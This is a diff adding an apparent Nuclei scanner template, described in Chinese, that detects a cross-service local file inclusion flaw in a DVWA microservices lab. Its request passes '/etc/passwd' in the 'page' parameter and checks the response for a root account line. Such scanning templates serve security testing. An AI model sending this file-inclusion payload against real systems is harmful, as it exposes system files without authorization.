@@ -1,0 +1,28 @@
+id: mscan-file-inclusion
+
+info:
+  name: DVWA-microservices 跨服务文件包含 (user-api -> vuln-fi)
+  author: pta
+  severity: high
+  description: |
+    链路: client -> gateway -> user-api(BFF) -> vuln-fi
+
+    vuln-fi 对 `page` 参数缺少路径限制, BFF 又未过滤, 任意本地文件可被包含。
+    以 `/etc/passwd` 作为标记文件, 通过匹配 `root:x:0:0:` 判定 LFI 成功。
+  tags: dvwa,lfi,file-inclusion,cross-service,microservice,bff
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/fi/?page=/etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
